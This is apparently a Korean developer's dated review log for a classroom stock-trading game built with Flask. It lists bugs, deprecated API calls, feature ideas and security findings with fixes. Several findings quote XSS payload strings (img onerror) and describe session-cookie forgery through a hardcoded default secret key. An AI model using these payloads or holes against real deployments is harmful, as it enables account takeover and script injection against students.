- **`models.py:8-13` `gen_code()` TOCTOU 경쟁 조건 + `create_room()` 미처리 `IntegrityError`** (`models.py:8-13`, `gen_code()`; `app.py:363-390`, `create_room()`): `gen_code()` 는 코드 중복 확인 쿼리와 INSERT 사이에 다른 요청이 동일 코드를 선점할 수 있는 TOCTOU 경쟁 조건 존재. `Room.code` 의 `unique=True` 제약으로 DB에서 걸러지지만, `create_room()` 에는 `join_room()` 과 달리 `IntegrityError` 핸들러가 없어 서버 500 오류 반환. 수정: `create_room()` 에 `except IntegrityError: db.session.rollback(); return jsonify({'error': '방 코드 생성 충돌, 재시도해 주세요.'}), 409` 추가. 추가로 `gen_code()` 에 `db.session.execute()` + UUID 기반으로 변경 검토.

- **`app.py:977` deprecated `Query.get()` 단독 잔존** (`app.py:977`, `minigame_close()`): 전체 코드에서 `db.session.get()` 패턴을 사용하지만 `minigame_close()` 함수 한 곳에서만 `room = Room.query.get(rid)` (구 Query.get API)를 사용 중. SQLAlchemy 2.0부터 deprecated이며 2.1에서 제거 예정. `db.session.get(Room, rid)` 로 교체하면 됨. 동일 함수 내 다른 DB 접근 패턴과 통일.

- **`app.py:13` 하드코딩 기본 시크릿 키 (보안)** (`app.py:13`): `app.secret_key = os.environ.get('SECRET_KEY', 'mock-stock-game-secret-2024')` — `SECRET_KEY` 환경변수 미설정 시 세션 서명 키가 GitHub 소스코드에 공개된 값으로 고정됨. 공격자가 이 값으로 Flask 세션 쿠키를 직접 위조해 임의 `user_id` 로 인증 가능. 최소 수정: `SECRET_KEY` 미설정 시 `import warnings; warnings.warn('SECRET_KEY 환경변수 미설정 — 운영 환경에서 반드시 지정하세요', stacklevel=2)` 출력. 개발 환경 전용 fallback으로 `os.urandom(32)` 도 가능 (재시작마다 세션 무효화됨).

- **`stock_service.py:297` `datetime.utcfromtimestamp()` deprecated** (`stock_service.py:297`, `get_history()`): `datetime.utcfromtimestamp(now - i * 86400).strftime('%Y-%m-%d')` 의 `utcfromtimestamp()` 도 Python 3.12 deprecated 대상. `from datetime import timezone` 을 `stock_service.py` 임포트에 추가하고 `datetime.fromtimestamp(now - i * 86400, tz=timezone.utc).strftime('%Y-%m-%d')` 로 교체. `app.py` 의 `datetime.utcnow()` 일괄 치환과 함께 Python 3.12 완전 호환성 확보.


## 2026-08-02

### 추가하면 좋을 기능

- **게임 진행 중 참여자 강퇴 기능 확장** (`app.py:564-575`, `kick_member()`): `kick_member()` 가 `room.status != 'waiting'` 이면 `"대기 중인 방에서만 강퇴할 수 있습니다."` 에러를 반환해 게임 시작 후 문제 학생을 내보낼 방법이 전혀 없음. 실제 수업에서 기기 오작동·비협조 학생 처리 방법 부재. 수정안: `active/paused` 상태에서도 강퇴를 허용하되, 강퇴 시 `RoomHolding`을 현재가로 현금화하고(`_end_room()` 내 청산 로직 재활용) `RoomMember`를 삭제. `rankings` 응답에 해당 학생이 사라지므로 순위가 자동 재편. 진행자 UI의 강퇴 버튼은 현재 대기 로비에만 있어(`app.js:228-229`) 게임 화면 랭킹 열에도 추가 필요.

- **참여자 로비 폴링 주기 단축** (`app.js:562-576`, `enterParticipantLobby()`): 현재 `setInterval(..., 5000)` 으로 5초마다 방 상태를 폴링해 진행자가 게임 시작 버튼을 누른 후 최대 5초 지연이 발생. 학생 30명이 동시에 5초 폴링하면 초당 6회 요청이 들어오므로 단순히 간격만 줄이면 안 됨. 대신 `enterParticipantLobby()` 에서 첫 폴링 직전 2초 지연 후 2000ms 주기로 3회만 빠르게 시도한 뒤 5000ms로 복귀하는 backoff 전략, 또는 서버가 `/api/rooms/<rid>` 응답에 `ETag` 헤더를 붙이고 클라이언트가 `If-None-Match`로 조건부 요청해 304 응답 시 내용 처리를 생략하면 서버 부하 유지하면서 지연 단축 가능.

- **방 최대 참여자 수 설정** (`models.py:25-42`, `app.py:363-406`): `Room` 모델에 `max_members` 컬럼이 없어 학급 규모에 상관없이 무제한 참여 가능. 반이 합쳐지는 경우 의도치 않은 과다 참여 발생 가능. `models.py` 의 `Room` 에 `max_members = db.Column(db.Integer, nullable=True)` 추가, `create_room()` (`app.py:363`) 에서 `d.get('max_members')` 로 선택적 수신, `join_room()` (`app.py:394`) 에서 `if room.max_members and RoomMember.query.filter_by(room_id=room.id).count() >= room.max_members: return 400` 체크 추가. UI 방 만들기 폼(`index.html:64-75`)에 선택 항목으로 추가하면 됨.

- **포트폴리오 탭에 수익률 미니 추세 스파크라인** (`app.js:735-752`, `refreshMyRank()`; `app.js:S.assetHistory`): `S.assetHistory` 배열에 10초마다 총자산 스냅샷이 최대 120개까지 누적되지만(`app.js:751`) 이 데이터는 현재 아무 UI에도 표시되지 않음. 포트폴리오 탭 상단 "총자산" 카드 아래에 `<canvas id="asset-sparkline" height="40">` 를 추가하고, `loadPortfolio()` 마지막에 `S.assetHistory` 를 Chart.js line 차트(pointRadius:0, borderWidth:1)로 렌더링하면 10줄 내외. 학생이 자신의 자산 증감 추이를 직관적으로 파악 가능.

- **진행자 퀴즈 설정에 문제 미리보기 기능** (`app.py:1399-1414`, `quiz_settings()`; `education_data.py`): 진행자 설정 탭에서 `reward_pct`와 `penalty_pct`만 조정 가능하고, 어떤 퀴즈 문제가 출제될지 미리 볼 수 없음. `GET /api/education/quiz-preview` 엔드포인트(login 불필요)를 추가해 `QUIZ_QUESTIONS` 전체를 반환하고, 진행자 설정 탭에 "퀴즈 문제 목록 보기" 버튼과 모달을 추가. 이미 `get_glossary()` 같은 교육 엔드포인트가 인증 없이 공개되어 있으므로(`app.py:1224-1227`) 일관성도 맞음. 진행자가 수업 내용과 연관된 문제인지 사전 확인 가능.

### 제거/단순화할 것들

- **`get_history()` 에서 `'1y'` 기간 봉 수 누락 — 30봉 fallback 적용** (`stock_service.py:293`, `app.py:715-718`): `get_chart()` 에서 `period_map = {..., '1y': ('1y', '1wk')}` 로 1년 탭을 지원하나, `get_history()` 내 `n_bars = {'1d': 30, '5d': 5, '1mo': 30, '3mo': 90}.get(period, 30)` 에 `'1y'` 키가 없어 `.get(period, 30)` 의 default=30 fallback으로 30봉만 생성됨. 연간 차트인데 한 달치 봉 수밖에 안 보이는 버그. `stock_service.py:293` 의 dict에 `'1y': 52` (주봉 52주) 를 추가하면 해결. 이미 어제 제안된 `n_bars` 리매핑 (`'1d': 7, '5d': 35`) 수정 시 함께 적용 권장.

- **`app.js:21` `S.quizTimerInterval` 상태 변수 선언 후 미사용** (`app.js:21`, `app.js:829-830`): `const S = {..., quizTimerInterval: null, ...}` 로 상태 객체에 선언되어 있으나 실제 퀴즈 타이머는 `let _quizTimerTick = null` (모듈 스코프 변수, `app.js:829`) 를 사용. `S.quizTimerInterval` 은 초기화 후 단 한 번도 읽거나 쓰이지 않음. 상태 객체에서 해당 필드 제거로 코드 명확성 향상. 실제 동작에는 영향 없음.

- **`host_adjust()` 에서 `target_uid = None` 일 때 명시적 검증 누락** (`app.py:593-603`, `host_adjust()`): `d.get('user_id')` 가 None 이면 `RoomMember.query.filter_by(room_id=rid, user_id=None)` 쿼리가 실행됨. SQLite/PostgreSQL 모두 `user_id = NULL` 조건은 행을 찾지 못해 `if not m: return 404` 로 처리되지만, 의도와 다른 쿼리가 실행되는 것 자체가 혼란. `if target_uid is None: return jsonify({'error': '대상 참여자를 지정하세요.'}), 400` 를 `app.py:595` 이후에 추가해 조기 반환. 클라이언트 `openAdjust()` 는 항상 uid를 전달하므로 정상 경로에 영향 없음.

- **복권 진행 중 상태(`_lots[rid]['current']`)가 서버 재시작 시 소실** (`app.py:174-179`, `_lot_round_due()`; `app.py:166-170`, `_lots` 선언): `done` 집합은 `Room.lottery_rounds_done` 컬럼으로 DB 영속화되어 서버 재시작 후 `_lot_round_due()` 에서 복원(`app.py:175-178`). 그러나 `_lots[rid]['current']` (진행 중인 복권 단계·마감시각·제출 번호 등)는 인메모리에만 존재해 서버 재시작 시 사라짐. Render free tier 는 무활동 15분 후 컨테이너를 슬립시켜 재시작이 잦음. 복권 picking/drawing 중 재시작 발생 시 학생이 선택한 번호와 상금이 무효화됨. 단기 해결: 재시작 후 `lottery_rounds_done` 의 가장 큰 round보다 큰 round가 진행 중이었다면 해당 round를 `done`에 추가해 건너뜀으로써 무한 대기를 방지. 장기: `Room` 모델에 `lottery_current_json = db.Column(db.Text, nullable=True)` 추가해 `current` dict를 직렬화 저장.

- **`_auto_start_lottery_if_due()` 내 `_invalidate_room_cache()` 와 호출부 `get_room()` 의 중복 invalidation** (`app.py:430`, `_auto_start_lottery_if_due()`; `app.py:469-472`, `get_room()`): `_auto_start_lottery_if_due()` 는 `room.status` 를 `'paused'` 로 변경 후 `_invalidate_room_cache(rid)` 를 직접 호출(`app.py:430`). `get_room()` 도 `prev_status = room.status` 비교(`app.py:469`)로 상태 변화 감지 시 `_invalidate_room_cache(rid)` 재호출(`app.py:472`). 동일 요청에서 캐시 무효화가 2회 실행됨. 버그는 아니나 `_auto_start_lottery_if_due()` 내의 `_invalidate_room_cache(rid)` 호출을 제거하고 호출부 `get_room()` 의 한 번 invalidation에 위임하면 중복 제거. 단, 다른 경로에서 `_auto_start_lottery_if_due()` 가 직접 호출될 가능성이 없음을 확인 후 적용.

## 2026-08-02 (2차)

### 추가하면 좋을 기능

- **거래 수수료(커미션) 옵션** (`app.py:363`, `create_room()`; `app.py:747-767`, `trade()`): 현재 거래 수수료가 없어 빈번한 소액 단타 거래를 억제할 수단이 없음. 방 생성 시 `commission_rate` (기본 0%, 최대 2%) 설정 옵션을 추가하고, `trade()` 에서 `fee = round(amount * commission_rate / 100)` 를 매수·매도 금액에 추가 공제한 뒤 `RoomTransaction(note=f'수수료 {fee:,}원')` 으로 기록. `Room` 모델에 `commission_rate = db.Column(db.Float, default=0.0)` 한 줄 추가, `trade()` 에서 3줄 수정, 방 만들기 UI에 슬라이더 추가. "왜 자주 사고팔면 손해인가"를 실제 잔액 감소로 체험하는 핵심 경제 교육 콘텐츠.

- **진행자 일시정지 사유 배너 표시** (`app.py:490-501`, `pause_room()`; `app.js:634`, `showPausedBanner()`): 진행자가 일시정지해도 학생 화면에는 "⏸ 게임이 일시정지되었습니다" 고정 텍스트만 표시되어 학생이 이유를 몰라 불안해함. `POST /api/rooms/<rid>/pause` 요청 바디에 `{"reason": "잠깐 설명 드리겠습니다"}` 를 받아 `room_dict()` 응답에 `pause_reason` 필드로 포함하고 클라이언트 배너에 사유 표시. `Room` 모델에 `pause_reason = db.Column(db.String(100), nullable=True)` 추가, 서버 3줄·클라이언트 2줄. 진행자 UI의 일시정지 버튼에 사유 입력란도 추가 가능.

- **서버 측 퀴즈 답변 제한 시간 검증** (`app.py:1267`, `get_quiz()`; `app.py:1279-1280`, `submit_quiz()`): 퀴즈 30초 타이머는 클라이언트 전용(`app.js:856-867`). 학생이 DevTools에서 `_quizTimerTick` 변수를 조작하거나 실행을 멈추면 무제한 시간 확보 가능. `get_quiz()` 에서 `_quiz_state[key]['question_dl'] = time.time() + 35` 를 저장하고, `submit_quiz()` 에서 `if time.time() > state.get('question_dl', float('inf')): answer = False` 로 시간 초과 시 자동 오답 처리(쿨다운 적용). 클라이언트 변경 없이 서버 약 4줄 추가. 공정한 게임 환경 보장.

- **포트폴리오 섹터 분산도 점수 표시** (`app.py:778-803`, `get_portfolio()`; `app.js:1456-1563`, `loadPortfolio()`): 포트폴리오 탭에 분산 투자 정도를 수치로 보여주면 학습 효과 증대. 허핀달-허쉬만 지수(HHI): `HHI = round(sum((v/total)^2 * 10000) for v in sector_values)` — 10000에 가까울수록 집중, 낮을수록 분산. `get_portfolio()` 응답에 `hhi_score`, `sector_weights: {sector: pct}` 추가(서버 8줄). 포트폴리오 요약 카드 아래에 "분산도 점수 XXX / 10000" 과 색상 게이지 바 표시(클라이언트 6줄). "분산 투자가 왜 유리한가"를 데이터로 설명 가능.

- **진행자 퀴즈 응답 집계 통계** (`app.py:1270-1342`, `submit_quiz()`): 진행자가 학생들의 퀴즈 정답률을 실시간으로 볼 수 없어 어떤 개념이 이해되지 않는지 파악 불가. `submit_quiz()` 에서 `_quiz_stats.setdefault(rid, {}).setdefault(qid, {'correct': 0, 'wrong': 0})` dict에 집계 저장. `GET /api/rooms/<rid>/host/quiz-stats` 엔드포인트로 문제별 정답률·응답 수 반환. 진행자 설정 탭에 "퀴즈 현황" 패널(문제 짧은 텍스트 + 정답률 바) 추가. 수업 중 이해도 낮은 개념 실시간 파악 → 즉석 보충 설명. 서버 15줄·클라이언트 20줄.

- **종목 비교 모달 (최대 3종목 동시 차트)** (`app.js:1327-1398`, `openStockModal()`·`loadChart()`; `app.py:710-719`, `get_chart()`): 현재 종목 상세 모달에서 단일 종목 차트만 표시. "비교 추가" 버튼으로 최대 3개 종목을 선택하면 동일 Chart.js 인스턴스에 다색 라인으로 중첩 비교. `get_chart()` 를 `Promise.all()` 로 병렬 호출해 datasets 배열로 추가. 서버 변경 없이 클라이언트 약 30줄 추가. "삼성전자 vs SK하이닉스 vs NVIDIA 누가 더 올랐나" 같은 수업 토론 자료 직접 생성 가능.

### 제거/단순화할 것들

- **`lobby_members()` 진행자 권한 미검증 — 모든 로그인 사용자가 멤버 조회 가능** (`app.py:577-585`, `lobby_members()`): `/api/rooms/<rid>/host/lobby-members` URL에 `host/` 가 포함되어 있으나 실제 코드에 `if room.host_id != user.id` 체크가 없고 `login_required` 데코레이터만 적용됨. 방에 참여하지 않은 다른 로그인 사용자도 해당 방 멤버 목록(user_id, username 전체)을 직접 GET 요청으로 열람 가능. `host_members()` (`app.py:547`) 패턴 그대로 `user = cur_user(); if room.host_id != user.id: return jsonify({'error': '권한 없음'}), 403` 을 `app.py:580` 에 추가하면 해결. 추가로 `get_rankings()` (`app.py:808`)도 `@login_required` 만 있고 방 참여 여부를 확인하지 않아 다른 방 멤버의 순위 노출 가능.

- **`create_room()` 숫자 파라미터 변환 미보호 → HTTP 500** (`app.py:384-386`, `create_room()`): `int(d.get('duration_minutes', 30))`, `float(d.get('starting_cash', 10_000_000))`, `float(d.get('deposit_rate', 3.0))` 세 곳 모두 try/except 없이 형 변환. `{"duration_minutes": "삼십분"}` 같은 직접 API 요청 시 `ValueError` → Flask 500 반환. 동일 패턴이 `host_market_event()` (`app.py:1353`: `float(d.get('pct', 0))`) 에도 존재. 각 변환을 `try...except (ValueError, TypeError): return jsonify({'error': '숫자 형식 오류'}), 400` 으로 감싸거나, `_safe_float(d, key, default)` 헬퍼를 만들어 재사용하면 일관된 400 반환 가능.

- **`app.js:1581` `t.note` 미이스케이프 → 진행자발 XSS** (`app.js:1581`, `loadTxn()`; `app.py:596`, `host_adjust()`): 거래 내역 렌더링 코드 `${t.note ? ' · ' + t.note : ''}` 에서 `t.note` 를 이스케이프 없이 `innerHTML` 에 삽입. 진행자가 `host_adjust()` 호출 시 `{"note": "<img src=x onerror='fetch(...)'>"}` 같은 note를 지정하면, 해당 방 학생 화면에서 임의 JS 실행 가능. `app.js:897` 에 이미 정의된 `escHtml()` 함수를 사용해 `${t.note ? ' · ' + escHtml(t.note) : ''}` 로 1글자 수정. 진행자 측 거래 내역 렌더링 코드도 동일 처리 필요.

- **`get_deposits()` 일시정지 시간 미반영 → 예상 이자 과대 표시** (`app.py:858-875`, `get_deposits()`; `app.py:132-143`, `_end_room()`): `_end_room()` 은 `game_end = room.paused_at` (일시정지 기준) 또는 `min(now, room.end_time)` 으로 실제 게임 진행 시간만 반영해 이자를 정산. 그러나 라이브 `get_deposits()` 뷰는 `held = (now - d.created_at).total_seconds()` 로 일시정지 시간을 포함 계산하므로, 게임이 N분 정지된 경우 학생이 보는 예상 이자가 최종 지급액보다 높게 표시됨. `room.paused_at` 이 있으면 `held = (min(now, room.paused_at) - d.created_at).total_seconds()` 로 교체하면 게임 진행 시 표시와 최종 지급이 일치.

- **`api.get()` / `api.post()` 네트워크 오류 미처리 → Uncaught Promise Rejection** (`app.js:30-43`, `api` 객체): `fetch()` 가 네트워크 연결 실패(ECONNREFUSED, timeout, CORS error)로 throw하면 `.ok` 체크 전에 예외 발생. `api` 래퍼에 catch가 없어 calling function으로 예외가 전파됨. `loadMarket()` 등 일부는 `.catch(() => null)` 로 보호하나 `loadHostMembers()`, `loadPortfolio()`, `execTrade()`, `doKickMember()` 등 대다수 호출자는 처리 없음. `api.get()` 과 `api.post()` 의 `await fetch(url)` 을 `try { const r = await fetch(url); ... } catch(e) { return {error: e.message}; }` 로 감싸면 모든 호출자에서 일관된 `{error: ...}` 응답 처리 가능.

- **룰렛·복권 트랜잭션 거래 내역에 "자산조정"으로 잘못 표시** (`app.py:840-841`, `get_transactions()`; `app.js:1584`, `loadTxn()`): `get_transactions()` 에서 `'name': STOCKS.get(t.symbol, {}).get('name', '자산조정') if t.action != 'ADJ' else '자산조정'` — action이 `'RLT'`(룰렛)이면 `STOCKS.get('ROULETTE', {})` → `'자산조정'` 반환. 학생 거래 내역에서 룰렛 상금과 복권 당첨금이 "자산조정"으로 표시돼 진행자 조정과 구별 불가. `ACTION_NAMES = {'ADJ': '자산조정', 'RLT': '룰렛', 'BUY': None, 'SELL': None}` dict를 추가해 symbol 조회보다 action 조회를 우선하도록 수정. 클라이언트도 `t.action === 'RLT' ? '룰렛' : t.action === 'ADJ' ? '조정' : ...` 분기 필요(`app.js:1584`).

- **`_quiz_settings` · `_roulette_config` 서버 재시작 시 초기화** (`app.py:1246`, `_quiz_settings`; `app.py:250`, `_roulette_config`): 진행자가 퀴즈 보상/패널티 비율(`reward_pct`, `penalty_pct`)과 룰렛 배율·확률을 수업 시작 전 커스터마이즈해도, Render free tier 슬립 후 재시작 시 기본값으로 리셋됨. 복권 완료 회차(`lottery_rounds_done`)는 `Room` DB 컬럼으로 영속화한 선례(`models.py:41`)가 있으므로 동일 패턴 적용: `Room` 모델에 `quiz_settings_json = db.Column(db.Text, nullable=True)`, `roulette_config_json = db.Column(db.Text, nullable=True)` 추가. 각 설정 엔드포인트에서 `json.dumps()` 로 저장, 조회 시 인메모리 `_quiz_settings.get(rid)` 없으면 DB `json.loads(room.quiz_settings_json)` 로 fallback. 마이그레이션 SQL은 기존 `ALTER TABLE` 패턴(`app.py:31-40`) 재사용.

---

## 2026-08-03

### 추가하면 좋을 기능

- **Excel 내보내기에 학생별 거래 내역 시트 추가** (`app.py:1419-1488`, `export_rankings()`): 현재 Excel은 "최종 순위" 시트 1장만 생성함. `openpyxl.Workbook()`에 학생별 시트를 추가해 각 학생의 매수/매도/룰렛/퀴즈 트랜잭션을 시간순으로 기록하면 수업 후 "왜 이 수익률이 나왔는가?" 피드백 근거를 제공할 수 있음. `RoomTransaction.query.filter_by(room_id=rid, user_id=m.user_id).order_by(...).all()`로 쿼리하고, `wb.create_sheet(f'{name}({sid})')`로 시트를 추가하면 기존 로직 재활용. 무료 배포 환경이므로 메모리 효율을 위해 학생 수 30명 이하로 제한 경고 추가 권장.

- **진행자 게임 중 시간 연장 기능** (`app.py:519-537`, `end_room()`; `app.py:475-488`, `start_room()`): 현재 호스트 UI에 게임 종료("end") 버튼만 있고 시간 추가 옵션이 없음. `POST /api/rooms/<rid>/host/extend` 엔드포인트를 추가해 `room.end_time += timedelta(minutes=int(d.get('minutes', 5)))`로 5분·10분 연장하면 수업이 늦게 시작되거나 흥미로운 장면에서 시간이 부족할 때 유용. `_invalidate_room_cache(rid)` 호출 포함. 클라이언트는 호스트 설정 탭에 "+5분" / "+10분" 버튼 2개 추가로 완성.

- **`refreshMyRank()` 대신 경량 개인 순위 전용 엔드포인트 추가** (`app.py:808-824`, `get_rankings()`; `app.js:735-752`): `refreshMyRank()`는 10초마다 전체 랭킹 목록을 받아 자신의 항목만 추출함. 30명 방 기준 1인당 매 폴링이 30명 전체 `member_total_value()`를 호출하므로 실질적으로 전체 N²회 DB 쿼리를 발생시킴. `GET /api/rooms/<rid>/my-rank` 신규 엔드포인트에서 요청자 1명의 `total_value`와 현재 순위(서브쿼리 또는 전체 정렬 후 인덱스)를 반환하면 DB 부하를 N분의 1로 줄일 수 있음. 단, 순위 산정을 위해 전체 조회가 불가피하므로 캐시 적용(`ROOM_CACHE_TTL` 활용)이 중요.

- **게임 진행 중 호스트 킥 기능 (active 상태)** (`app.py:564-575`, `kick_member()`; `app.js:228-230`): `kick_member()`는 `room.status != 'waiting'`이면 400 반환(line 570)해 게임 시작 후에는 강퇴 불가. 수업 중 접속만 하고 아무 거래도 하지 않거나 이탈한 학생을 처리할 수 없어 순위판이 오염됨. `status == 'active'` 시 킥 허용 + 해당 학생의 보유 주식 전량 현금화(현재 `_end_room()` 내 정산 로직 재사용) + `RoomHolding` 삭제 후 `RoomMember` 삭제 순서로 처리하면 데이터 일관성 유지. `Deposit`도 `status='withdrawn'` 처리 필요.

- **개인 퀴즈 응답 타임스탬프 서버 기록** (`app.py:1248-1342`, `get_quiz()`, `submit_quiz()`): 현재 서버는 퀴즈 문제를 전송한 시각을 기록하지 않아 학생이 문제를 본 뒤 무제한 시간 후 제출 가능. `_quiz_state[key] = {'qid': q['id'], 'cooldown_until': 0, 'seen': seen, 'sent_at': time.time()}`로 발송 시각을 저장하고, `submit_quiz()` 에서 `time.time() - state['sent_at'] > 35`이면 시간 초과로 자동 오답 처리하면 클라이언트 타이머 우회를 방지할 수 있음. 서버 2줄 추가로 구현 가능.

### 제거/단순화할 것들

- **`lottery_skip()` 스킵 회차 DB 미저장 — 서버 재시작 후 재트리거** (`app.py:1209-1219`, `lottery_skip()`): `lot.setdefault('done', set()).add(round_n)` 으로 인메모리 `_lots[rid]['done']` 만 업데이트하고, 복권 완료 시 DB에 저장하는 `room.lottery_rounds_done`(`app.py:228-229`)에는 반영하지 않음. Render free tier 슬립 후 재시작 시 `_lot_round_due()` 가 `DB.lottery_rounds_done`에서 done set을 복원(`app.py:175-178`)하므로 스킵한 회차가 다시 due로 감지돼 복권이 재트리거됨. `lottery_skip()` 내에서도 `room = db.session.get(Room, rid); room.lottery_rounds_done = ...; db.session.commit()` 패턴을 `_do_reveal()`과 동일하게 추가해야 함 (`app.py:1218` 직후).

- **`doRouletteSpin()` 2회차 이상 베팅 한도 불일치** (`app.js:1065`, `app.js:1038`, `app.js:1066-1068`): 룰렛 첫 스핀 후 `_rltCash = data.cash` (현금만, line 1065)로 갱신되고 2회차 베팅 시 `if (bet > _rltCash)` (line 1038)로 현금만 기준 검증. 그러나 서버 `minigame_spin()`은 `total_assets`(현금+주식+예금) 기준으로 베팅 허용(`app.py:1020`). 현금 0원·주식 500만원 보유 학생이 2회차 스핀 시 클라이언트는 "잔액 부족" 오류를 표시하지만 서버는 주식 자동 청산 후 처리 가능. 비동기로 `total_assets`를 재조회하는 로직이 line 1066-1068에 있지만 await가 없어 베팅 입력 시점에 `_rltCash`가 구버전일 수 있음. `openRouletteModal()` 최초 로드 시 받은 `total_assets`를 별도 변수로 유지하고 스핀 결과 후 `await api.get(.../minigame)`의 응답을 기다린 뒤 다음 스핀 UI를 활성화하면 해결됨.

- **`showBombNews()` 뉴스 2건 이상일 때 3초 표시 시간 부족** (`app.js:1175-1177`): `setTimeout(() => popup.style.display = 'none', 3000)` 고정. 뉴스 아이템이 2건인 경우 팝업 높이가 증가하지만 시간이 동일해 두 번째 헤드라인을 읽기 전에 사라짐. `const displayMs = 2500 + items.length * 1200;` 와 같이 아이템 수에 비례해 표시 시간을 늘리고(`app.js:1175`), `bar` 애니메이션 duration도 `bomb-news-bar` 인라인 스타일로 같이 조정하면 가독성이 개선됨. 변경은 JS 3줄.

- **`create_deposit()` 예금 후 현금 0원 허용 — 거래 완전 불가 상태** (`app.py:878-902`, `create_deposit()`): `if m.cash < amount` 체크만 있어 전액 예금이 가능. 1,000만원 전액 예금 후 현금 0원 상태에서 매수 시 "잔액 부족" 오류만 표시되고 해결 방법 안내 없음(예금 해지 기능을 모르는 학생은 게임 참여 불가). 최소 잔액 `min_reserve = room.starting_cash * 0.05` (예: 50만원) 를 예금 허용 금액 상한으로 설정하거나, 0원 예금 완료 시 프론트에 "예금 탭에서 해지 가능" 안내 토스트(`app.js`)를 자동 표시하면 학습 중단 방지. 서버 1줄, 클라이언트 1줄.

- **`get_history()` 차트 데이터 캐시 미스 시 매번 다른 랜덤 생성 — 교육용 일관성 저해** (`stock_service.py:281-310`): `_history_cache` TTL 120초 만료 또는 가격 변경(`get_price()` line 187-189, `force_price()` line 227-228)으로 캐시 무효화 후 `get_history()` 재호출 시 완전히 새로운 랜덤 봉차트를 생성함. 같은 종목을 두 번 차트로 열면 전혀 다른 "과거" 패턴이 표시되어 교사가 "이 차트의 패턴을 보세요"라고 설명하는 도중 학생마다 다른 화면을 보게 됨. 해결책: 룸 시작 시 `_init_prices()`에서 종목별 시드값 `random.seed(hash((room_id, sym)) % 2**32)`를 고정하거나, 생성된 히스토리를 캐시 무효화 없이 유지하고 현재 가격만 마지막 봉으로 덮어쓰는 방식으로 일관성 확보.

## 2026-08-03 (2차)

### 추가하면 좋을 기능

- **거래 빈도 쿨다운 제한 설정 (호스트 설정 탭)** (`app.py:724-767` `trade()`; `app.js:1424-1454` `execTrade()`): 현재 거래에 횟수·빈도 제한이 전혀 없어 학생이 매수/매도 버튼을 초당 수회 클릭해 서버에 불필요한 DB 부담을 줌. 진행자 설정 탭에 "거래 쿨다운(초)" 입력란을 추가하고, 서버에 `_trade_ts: dict = {}` (in-memory `{(rid, uid): last_ts}`)를 두어 `trade()` 진입 시 `now - last < cooldown` 이면 429 반환하면 됨. 클라이언트 `execTrade()` 에서도 버튼을 쿨다운 동안 비활성화 처리 가능. 서버 10줄, 클라이언트 5줄 수준의 소규모 변경.

- **결과 화면에 학급 전체 통계 섹션 추가** (`app.py:1419-1488` `export_rankings()`; `app.js:1702-1795` `loadResults()`): 게임 종료 후 결과 화면에 진행자 전용 통계 블록 (평균 수익률, 수익·손실 인원 수, 전체 거래 건수 합계, 가장 많이 거래된 종목 TOP 3)을 추가하면 수업 피드백에 즉각 활용 가능. 현재 이 정보는 Excel 파일 안에서만 계산 가능하며 화면에는 없음. `GET /api/rooms/<rid>/stats` 신규 엔드포인트에서 `RoomTransaction.query.filter_by(room_id=rid)` 집계 후 JSON 반환, `loadResults()` 말미에서 호출해 `results-my-stats` 아래 삽입.

- **게임 로비에서 폭탄뉴스 팝업 미리보기** (`app.py:691-701` `host_send_news()`; `static/index.html:103-111` 로비 화면): 현재 `host_send_news()` 는 room status 체크 없이 StockService에 뉴스를 트리거하므로 `waiting` 상태에서도 호출 가능. 진행자 로비 화면(`screen-host-lobby`)에 "뉴스 팝업 테스트" 버튼 1개를 추가하고 `doSendNews()` 와 동일한 API 호출을 실행하면, 게임 시작 전에 팝업 애니메이션·소리 동작을 확인 가능. HTML 1줄 + JS 2줄 추가.

- **룰렛 베팅 시 강제 주식 청산 내역 팝업 안내** (`app.py:1022-1058` `minigame_spin()`; `app.js:1043-1048`): 베팅 금액이 현금을 초과할 때 서버가 주식·예금을 자동 청산하지만, 클라이언트에는 단순히 `data.cash` 만 반환되어 학생이 어떤 종목이 얼마에 청산됐는지 모름. `minigame_spin()` 응답에 `liquidated: [{'symbol': sym, 'shares': n, 'amount': v}]` 필드를 추가하고, `doRouletteSpin()` 결과 표시 시 청산 내역이 있을 경우 "⚠️ 베팅 자금 마련을 위해 X주 청산됨" 안내 토스트를 추가 표시. 서버 5줄, 클라이언트 5줄.

- **참여자 로비에서 방 코드 재표시** (`static/index.html:340-352`; `app.js:555-576` `enterParticipantLobby()`): 참여자 대기 화면(`screen-p-lobby`)에 방 이름과 진행자 이름은 표시되지만 방 코드가 없음. 학생이 실수로 뒤로 가기를 누른 뒤 재입장하려면 코드를 다시 물어봐야 하는 불편이 있음. `plobby-room-name` 아래 `<div class="muted" style="font-size:12px">방 코드: <strong style="letter-spacing:2px">XXXXXX</strong></div>` 한 줄 추가 후 `enterParticipantLobby()` 에서 `S.room.code` 를 세팅하면 됨. HTML 3줄, JS 1줄.

### 제거/단순화할 것들

- **`Room.query.get_or_404(rid)` 전체 deprecated SQLAlchemy Query API 패턴** (`app.py:435, 478, 490, 504, 519, 542, 545, 564, 587, 630, 673, 691, 703, 710, 724, 772, 808, 829, 878, 904, 921, 938, 965, 996, 1078, 1149, 1185, 1209, 1270, 1345, 1363, 1386, 1399, 1419`): SQLAlchemy 2.x / Flask-SQLAlchemy 3.x 에서 `Model.query.get_or_404()` 는 deprecated이며, 권장 대체는 `db.get_or_404(Room, rid)`. 추가로 `app.py:977` 의 `Room.query.get(rid)` 도 `db.session.get(Room, rid)` 로 교체 필요. 현재 동작은 하지만 버전 업그레이드 시 warning이 쏟아지고 미래에는 제거될 예정. `sed -i` 등으로 일괄 치환 가능하며, 교체 후 동작 차이 없음.

- **`loadLobbyMembers()` / `loadHostMembers()` innerHTML XSS 취약점 — `escHtml()` 미적용** (`app.js:225, 228, 417`): `${m.username}` 을 HTML 템플릿 리터럴에 직접 삽입. 닉네임에 `<img src=x onerror=alert(1)>` 같은 문자열이 들어오면 XSS 실행 가능. `loadParticipantRankings()` (line 1685)와 `loadResults()` (line 1748)에서는 이미 `escHtml(e.username)` 을 올바르게 사용 중이나 로비·호스트 대시보드에서 누락됨. `escHtml()` 함수가 `app.js:897-899`에 이미 구현되어 있으므로, `${m.username}` → `${escHtml(m.username)}` 교체 5곳으로 즉시 해결. 교실 환경에서 학생이 의도적으로 HTML 닉네임을 사용할 가능성이 있음.

